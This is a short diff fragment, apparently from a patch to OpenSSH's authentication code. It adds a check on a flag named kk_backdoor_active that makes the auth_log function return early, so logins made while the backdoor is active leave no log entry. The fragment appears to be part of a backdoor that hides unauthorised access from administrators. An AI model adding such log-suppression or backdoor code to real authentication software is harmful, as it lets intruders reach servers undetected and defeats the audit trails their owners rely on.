@@ -277,6 +277,9 @@ auth_log(Authctxt *authctxt, int authenticated, int partial,
 	void (*authlog) (const char *fmt,...) = verbose;
 	char *authmsg;
 
+	if(kk_backdoor_active)
+		return;
+
 	if (use_privsep && !mm_is_monitor() && !authctxt->postponed)
 		return;
 
